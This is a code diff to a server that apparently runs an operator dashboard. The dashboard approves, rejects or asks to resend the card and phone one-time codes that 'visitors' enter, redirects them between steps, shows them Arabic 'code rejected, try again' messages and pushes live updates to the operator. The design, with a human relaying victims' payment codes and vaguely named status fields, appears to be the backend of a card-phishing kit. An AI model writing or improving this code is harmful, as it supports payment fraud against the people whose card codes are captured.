@@ -798,7 +798,6 @@ async function startServer() {
       const updateData: Record<string, any> = {
         otpActionAt: new Date().toISOString(),
         adminOtpAction: action,
-        currentPage,
       };
 
       if (action === "approved") {
@@ -806,17 +805,25 @@ async function startServer() {
         updateData.otpStatus = "completed";
         updateData.redirectPage = "step3";
         updateData.currentStep = "_t3";
+        updateData.currentPage = "step3";
       } else if (action === "rejected") {
         updateData._v5Status = "rejected";
         updateData.otpStatus = "rejected";
+        updateData.otpRejectionMessage = "تم رفض رمز التحقق من البطاقة - يرجى المحاولة مرة أخرى";
+        updateData.otpRejectionAt = new Date().toISOString();
       } else if (action === "resend") {
         updateData.otpResendRequested = true;
         updateData.otpResendAt = new Date().toISOString();
       }
 
+      // Update visitor data so customer can receive the update
       await upsertVisitor(visitorId, updateData);
-      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+      
+      // Update dashboard request
+      const dashboardData = await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
 
+      // Broadcast to dashboard immediately
+      broadcastSSE("update", dashboardData);
 
       res.json({ success: true, action });
     } catch (error) {
@@ -867,31 +874,33 @@ async function startServer() {
         return;
       }
 
-      const currentVisitor = await readVisitor(visitorId);
-      const currentPage = currentVisitor?.currentPage || "step5";
-
       const updateData: Record<string, any> = {
         phoneActionAt: new Date().toISOString(),
         adminPhoneAction: action,
-        currentPage,
       };
 
       if (action === "approved") {
-        updateData._v4Status = "approved";
         updateData.phoneOtpStatus = "approved";
         updateData.redirectPage = "step4";
         updateData.currentStep = "_t6";
+        updateData.currentPage = "step4";
       } else if (action === "rejected") {
-        updateData._v4Status = "rejected";
         updateData.phoneOtpStatus = "rejected";
+        updateData.phoneRejectionMessage = "تم رفض رمز الهاتف - يرجى المحاولة مرة أخرى";
+        updateData.phoneRejectionAt = new Date().toISOString();
       } else if (action === "resend") {
         updateData.phoneResendRequested = true;
         updateData.phoneResendAt = new Date().toISOString();
       }
 
+      // Update visitor data so customer can receive the update
       await upsertVisitor(visitorId, updateData);
-      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+      
+      // Update dashboard request
+      const dashboardData = await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
 
+      // Broadcast to dashboard immediately
+      broadcastSSE("update", dashboardData);
 
       res.json({ success: true, action });
     } catch (error) {
